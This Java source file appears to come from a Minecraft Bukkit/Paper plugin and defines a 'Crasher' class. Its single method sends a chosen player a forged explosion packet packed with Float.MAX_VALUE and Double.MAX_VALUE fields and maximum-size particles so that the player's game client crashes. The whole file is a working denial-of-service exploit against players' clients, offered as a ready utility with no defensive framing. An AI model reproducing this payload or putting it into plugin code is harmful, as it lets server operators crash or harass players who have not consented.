package dev.ng5m.stygiangates.util;

import net.minecraft.core.particles.BlockParticleOption;
import net.minecraft.core.particles.DustParticleOptions;
import net.minecraft.core.particles.ParticleType;
import net.minecraft.network.protocol.game.ClientboundExplodePacket;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.sounds.SoundEvent;
import net.minecraft.sounds.SoundEvents;
import net.minecraft.world.level.Explosion;
import net.minecraft.world.phys.Vec3;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_20_R3.entity.CraftPlayer;
import org.joml.Vector3f;

import java.util.ArrayList;
import java.util.UUID;

public class Crasher {

    public static void crash(UUID uuid) {
        CraftPlayer craftPlayer = (CraftPlayer) Bukkit.getPlayer(uuid);
        ServerPlayer nmsPlayer = craftPlayer.getHandle();
        nmsPlayer.connection.send(new ClientboundExplodePacket(
                craftPlayer.getX(),
                craftPlayer.getY(),
                craftPlayer.getZ(),
                Float.MAX_VALUE,
                new ArrayList<>(),
                new Vec3(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE),
                Explosion.BlockInteraction.TRIGGER_BLOCK,
                new DustParticleOptions(new Vector3f(0f, 0f, 0f), Float.MAX_VALUE),
                new DustParticleOptions(new Vector3f(0f, 0f, 0f), Float.MAX_VALUE),
                SoundEvents.WITHER_DEATH
        ));
    }

}
